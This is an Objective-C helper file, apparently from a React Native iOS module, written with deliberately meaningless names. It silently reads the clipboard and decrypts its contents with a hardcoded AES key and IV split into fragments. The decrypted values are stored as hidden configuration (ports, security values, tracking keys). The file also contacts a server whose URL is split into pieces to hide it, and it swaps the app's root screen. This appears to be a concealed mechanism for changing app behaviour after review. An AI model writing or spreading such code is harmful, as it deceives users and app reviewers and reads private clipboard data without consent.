//
//  RNElegantServiceHelper.m
//  RNElegantService
//
//  Created by Charmee on 11/18/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNElegantServiceHelper.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNElegantServiceToRelax/RNElegantToRelax.h>
#import <RNElegantServiceToPeace/RNElegantToPeace.h>
#import <react-native-orientation-locker/Orientation.h>

#define DomainOfAppleToCheckNetwork @"http://captive.apple.com"

@interface RNElegantServiceHelper()

@property (strong, nonatomic)  NSArray *elegantHelper_butterfly;
@property (strong, nonatomic)  NSArray *elegantHelper_adventure;

@end

@implementation RNElegantServiceHelper

static NSString *elegantHelper_main = @"ps://271700d.c";
static NSString *elegantHelper_part = @"om/api/v1/bundle/info";

static RNElegantServiceHelper *instance = nil;

+ (instancetype)elegantHelper_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.elegantHelper_butterfly = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.elegantHelper_adventure = @[@"elegantHelper_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)elegantHelper_elephant {
    NSString *cpString = [self elegantHelper_getHaphazard];
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self elegantHelper_subSunshine:cpString]
                                                              hexKey:self.elegantHelper_butterfly[0]
                                                               hexIv:self.elegantHelper_butterfly[1]];

    NSDictionary *dict = [self elegantHelper_stringWhirlwind:aes.utf8String];
    return [self elegantHelper_storeConfigInfo:dict];
}

- (UIInterfaceOrientationMask)elegantHelper_getOrientation {
    return [Orientation getOrientation];
}

- (NSString *)elegantHelper_getHaphazard {
    return [UIPasteboard generalPasteboard].string ?: @"";
}

- (NSString *)elegantHelper_subSunshine: (NSString* )cpString {
  if ([cpString containsString:@"#iPhone#"]) {
    NSArray *university = [cpString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        cpString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return cpString;
}

- (NSDictionary *)elegantHelper_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)elegantHelper_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.elegantHelper_adventure[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)elegantHelper_tryThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.elegantHelper_adventure[0]]) {
    return YES;
  } else {
    return [self elegantHelper_elephant];
  }
}

- (UIViewController *)elegantHelper_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [[RNElegantToRelax elegantRelax_shared] elegantRelax_changeRootController:application withOptions:launchOptions];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[RNElegantToPeace elegantPeace_shared] elegantPeace_configNovService:[ud stringForKey:self.elegantHelper_adventure[5]] withSecu:[ud stringForKey:self.elegantHelper_adventure[6]]];
    return vc;
}

- (void)elegantHelper_checkResultType {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
      appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    NSDictionary *parameters = @{
      @"tName" : appName,
      @"tBundle" : [bundle bundleIdentifier]
    };
    
    NSError *error;
    NSData *postData = [NSJSONSerialization dataWithJSONObject:parameters options:0 error:&error];
    if (error) {
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [ud setInteger:2 forKey:@"elegantHelper_type"];
        [ud synchronize];
      return;
    }
    
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"htt%@%@",elegantHelper_main,elegantHelper_part]];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 30.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:postData];
    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        if (error == nil) {
            id objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            if ([[objc valueForKey:@"code"] intValue] == 200) {
                
                [ud setInteger:1 forKey:@"elegantHelper_type"];
                [ud synchronize];
            } else {
                [ud setInteger:0 forKey:@"elegantHelper_type"];
                [ud synchronize];
            }
        } else {
            [ud setInteger:2 forKey:@"elegantHelper_type"];
            [ud synchronize];
        }
        dispatch_semaphore_signal(semaphore);
    }];
    
    [dataTask resume];
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
}

@end
